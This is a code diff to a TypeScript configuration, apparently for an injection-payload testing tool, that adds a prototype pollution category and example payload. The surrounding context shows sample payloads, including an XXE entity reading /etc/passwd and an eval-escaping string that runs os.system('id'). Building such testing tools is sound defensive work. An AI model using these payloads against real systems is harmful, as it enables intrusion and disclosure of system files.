@@ -41,6 +41,7 @@ export const LANG_GROUPS: LangGroup[] = [
       { value: "xxe", label: "XXE" },
       { value: "yaml", label: "YAML" },
       { value: "csv", label: "CSV formula" },
+      { value: "prototype", label: "Prototype pollution" },
     ],
   },
   {
@@ -96,6 +97,7 @@ export const DIALECTS: Record<Lang, string[]> = {
   path: [],
   mail: [],
   xxe: [],
+  prototype: [],
   code: ["python", "javascript", "php"],
   crlf: ["header", "log"],
   prompt: [],
@@ -180,6 +182,10 @@ export const EXAMPLES: Record<Lang, Example> = {
     payload:
       '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
   },
+  prototype: {
+    template: "{INPUT}",
+    payload: '{"__proto__": {"polluted": true}}',
+  },
   code: {
     template: 'eval("result = {INPUT}")',
     payload: "\"; __import__('os').system('id') #",
@@ -234,5 +240,6 @@ export const supportsMutation = (lang: Lang): boolean =>
   lang === "path" ||
   lang === "mail" ||
   lang === "xxe" ||
+  lang === "prototype" ||
   lang === "code" ||
   lang === "crlf";
